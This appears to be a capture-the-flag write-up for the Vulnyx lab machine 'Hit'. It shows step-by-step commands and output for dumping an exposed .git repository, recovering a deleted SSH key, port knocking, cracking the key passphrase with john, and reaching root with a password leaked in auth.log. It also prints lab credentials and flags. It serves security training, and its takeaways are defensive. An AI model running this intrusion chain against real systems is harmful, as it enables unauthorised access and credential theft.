# Vulnyx: Hit

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `dirb` · `git-dumper` · `knock` · `ssh2john` · `john` · `hydra` |
| **Tags** | `#GitLeak` `#PortKnocking` `#HashCracking` `#LogFileCredentialLeak` |
| **URL** | https://vulnyx.com/machines/ |

An exposed `.git` directory on the web server gives up its full commit history, where an earlier commit still holds a private SSH key that a later one removed from the working tree. SSH itself isn't reachable until the right port-knock sequence is sent, and the key's passphrase falls to `rockyou.txt`. From there, a log file leaks a `root` password that was recorded by mistake during a fumbled login.

## Enumeration

### Port Enumeration

A full TCP port scan returns only **80 (HTTP)** — itself a hint that something else (SSH included) is deliberately hidden:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn hit.nyx

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:FE:A8:90 (Oracle VirtualBox virtual NIC)
```

```bash
$ sudo nmap -p 80 -sCV hit.nyx

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
| http-git:
|   hit.nyx:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Commit #5
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:FE:A8:90 (Oracle VirtualBox virtual NIC)
```

The `http-git` script already flags an exposed `.git/` directory — the most promising lead on the box.

### Web Enumeration

```
http://hit.nyx/
```

<img src="../Images/hit/Pasted image 20260804164507.png"/>

```bash
$ dirb http://hit.nyx

---- Scanning URL: http://hit.nyx/ ----
+ http://hit.nyx/.git/HEAD (CODE:200|SIZE:23)
+ http://hit.nyx/index.html (CODE:200|SIZE:186)
```

`dirb` confirms `.git/` is served directly, so the whole repository is fair game.

## Initial Access

### Loot: An Exposed .git Directory

Because `.git` is reachable directly, the entire repository — history included — comes down with `git-dumper` instead of just the current files the web server exposes:

```bash
$ git-dumper http://hit.nyx/.git/ ~/Vulnyx/Easy/Hit
$ ls -la ~/Vulnyx/Easy/Hit
```

```bash
$ git log
commit 2b5a7479c36d425981b95982c37b10a34ce11aca (HEAD -> master)
Author: charlie <charlie@hit.nyx>
Date:   Mon Feb 3 23:33:01 2025 +0100

    Commit #5

commit 7dff168ec5d2174eae9a7ff7f4d1d87080a6c726
Author: charlie <charlie@hit.nyx>
Date:   Mon Feb 3 23:32:38 2025 +0100

    Commit #4

commit a9980936fd3d509433e9862e9021aa5fb13351ac
Author: charlie <charlie@hit.nyx>
Date:   Mon Feb 3 23:31:33 2025 +0100

    Commit #3

commit 0cf5be47bae50c4aac01531288e7f71ba4be167c
Author: charlie <charlie@hit.nyx>
Date:   Mon Feb 3 23:30:12 2025 +0100

    Commit #2

commit 9ca5eedec55e3c900f8685460aa4ce605f3d8472
Author: charlie <charlie@hit.nyx>
Date:   Mon Feb 3 23:29:26 2025 +0100

    Commit #1
```

The history is five near-identical commits, so the diffs are where anything interesting hides. `git show` on `Commit #3` reveals why it stands out:

```bash
$ git show a9980936fd3d509433e9862e9021aa5fb13351ac
```

<img src="../Images/hit/Pasted image 20260805163903.png"/>
<img src="../Images/hit/Pasted image 20260805163932.png"/>

That commit adds a private SSH key that a later commit removes from the working tree — recoverable regardless, since dropping a file from history takes more than an ordinary commit. `git checkout` pulls it straight back out of that commit, with no need to reset anything else:

```bash
$ git checkout a9980936fd3d509433e9862e9021aa5fb13351ac
```

```bash
$ ls -la
total 20
drwxrwxr-x   3 kali kali 4096 Aug  5 10:41 .
drwxrwxr-x  30 kali kali 4096 Aug  4 10:20 ..
drwxrwxr-x   7 kali kali 4096 Aug  5 10:41 .git
-rw-------   1 kali kali 1743 Aug  5 10:41 id_rsa
-rw-rw-r--   1 kali kali  163 Aug  5 10:41 knockd.conf
```

The checkout also brings back `knockd.conf` — worth noting, since SSH still isn't reachable.

### Port Knocking

SSH doesn't show up in any scan so far. Port knocking — sending connection attempts to a specific sequence of closed ports in order — is a common way to keep a service hidden from casual scanning while still reachable to anyone who knows the sequence. `knockd.conf`, the daemon's own configuration recovered in that same working tree, is exactly where that sequence comes from rather than guessing it:

```bash
$ knock hit.nyx 7000:tcp 8000:tcp 9000:tcp
```

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn hit.nyx

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:FE:A8:90 (Oracle VirtualBox virtual NIC)
```

`knockd.conf` typically defines separate sequences to open and to close the service; the first attempt leaves port 22 shut, so the other sequence is the one that opens it:

```bash
$ knock hit.nyx 65535:tcp 8888:tcp 54111:tcp
```

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn hit.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:FE:A8:90 (Oracle VirtualBox virtual NIC)
```

### Cracking id_rsa's Passphrase

SSH refuses a private key readable by anyone but its owner, so a quick `chmod` tightens the permissions first:

```bash
$ chmod 600 id_rsa
$ ssh charlie@hit.nyx -i id_rsa
Enter passphrase for key 'id_rsa':
```

The key is passphrase-protected, so `ssh2john` extracts the hash and `john` cracks it against `rockyou.txt`:

```bash
$ ssh2john id_rsa > rsa_hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt rsa_hash

Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
charlie1         (id_rsa)
```

> **Passphrase:** `charlie1`

### Shell as charlie

```bash
$ ssh charlie@hit.nyx -i id_rsa
Enter passphrase for key 'id_rsa':
charlie@hit:~$ id
uid=1000(charlie) gid=1000(charlie) groups=1000(charlie),4(adm)
charlie@hit:~$ ls -l /home/
total 4
drwx------    4 charlie  charlie       4096 Feb  3  2025 charlie
charlie@hit:~$ ls -l /home/charlie/
total 4
-r--------    1 charlie  charlie         33 Feb  3  2025 user.txt
charlie@hit:~$ cat /home/charlie/user.txt
21744d4a65af82ac691cb3381c033d37
```

Note the `adm` group in `charlie`'s `id` — that grants read access to the system logs, which matters immediately below.

> **User flag:** `21744d4a65af82ac691cb3381c033d37`

## Privilege Escalation

### Loot: Credentials in Log Files

Membership in `adm` makes `/var/log` readable, so it's the natural first place to hunt:

```bash
charlie@hit:~$ ls -l /var/log/
total 2260
-rw-r--r--    1 root     root                0 Aug  5 16:33 alternatives.log
-rw-r--r--    1 root     root             9882 Feb  2  2025 alternatives.log.1
drwxr-xr-x    2 root     root             4096 Aug  5 16:33 apt
-rw-r-----    1 root     adm             10788 Aug  5 16:43 auth.log
-rw-rw----    1 root     utmp                0 Aug  5 16:33 btmp
-rw-rw----    1 root     utmp             4224 Feb  3  2025 btmp.1
-rw-r-----    1 root     adm             43591 Aug  5 16:43 cron.log
-rw-r-----    1 root     root                0 Aug  5 16:33 dpkg.log
-rw-r--r--    1 root     root           199893 Feb  3  2025 dpkg.log.1
-rw-r--r--    1 root     root                0 Nov 15  2023 faillog
drwxr-xr-x    3 root     root             4096 Nov 15  2023 installer
drwxr-sr-x+   3 root     systemd-journal  4096 Nov 15  2023 journal
-rw-r-----    1 root     adm            673915 Aug  5 16:43 kern.log
-rw-r--r--    1 root     adm              1255 Aug  5 16:43 knockd.log
-rw-r--r--    1 root     root             1255 Aug  5 16:43 lastlog
-rw-rw-r--    1 root     utmp           292292 Feb  3  2025 nginx
drwxr-xr-x    2 root     adm              4096 Feb  3  2025 private
drwx------    2 root     root             4096 Nov 15  2023 README
lrwxrwxrwx    1 root     root               39 Nov 15  2023 runit -> ../../usr/share/doc/systemd/README.logs
drwxr-xr-x    3 root     root             4096 Nov 15  2023 syslog
-rw-r-----    1 root     adm           1187794 Aug  5 16:43 wtmp
```

A recursive grep for anything resembling a credential turns up a single, telling line:

```bash
charlie@hit:~$ cd /var/log
charlie@hit:/var/log$ grep --color -riE "user|pass" . 2>/dev/null

auth.log:2025-02-03T09:50:56.693974+01:00 hit sshd[701]: Failed password for invalid user r00tP4zzw0rd from 192.168.1.10 port 45796 ssh2
```

`auth.log` holds a `root` password in plaintext — not because any application logged a credential on purpose, but because someone fat-fingered an SSH login and put their password where the username belongs (e.g. `ssh r00tP4zzw0rd@hit.nyx` instead of `ssh root@hit.nyx`). sshd dutifully logs the bogus "username" it was handed, password and all:

> **Credentials:** `root:r00tP4zzw0rd`

### Root Access via a Leaked Log Credential

The leaked password is tested straight against SSH as `root`:

```bash
$ hydra -l 'root' -p 'r00tP4zzw0rd' ssh://hit.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://hit.nyx:22/
[22][ssh] host: hit.nyx   login: root   password: r00tP4zzw0rd
1 of 1 target successfully completed, 1 valid password found
```

```bash
$ ssh root@hit.nyx
root@hit.nyx's password:
root@hit:~# id
uid=0(root) gid=0(root) groups=0(root)
root@hit:~# ls -l /root/
total 4
-r--------    1 root     root            33 Feb  3  2025 root.txt
root@hit:~# cat /root/root.txt
f4b9848754562bfeffbeb8cc8257048c
```

> **Root flag:** `f4b9848754562bfeffbeb8cc8257048c`

## Takeaways

- An exposed `.git` directory is effectively the entire project history, not just its current state — a key or credential added and later "removed" in a follow-up commit is still fully recoverable with `git checkout <commit>`.
- Port knocking is obscurity, not real access control — it stops a service from showing up in a scan, but does nothing once the correct sequence is known or guessed.
- Application and system logs are a surprisingly common place for credentials to leak, especially when input meant to be a username ends up logged verbatim during a failed or malformed login attempt — and any account in the `adm` group can read them.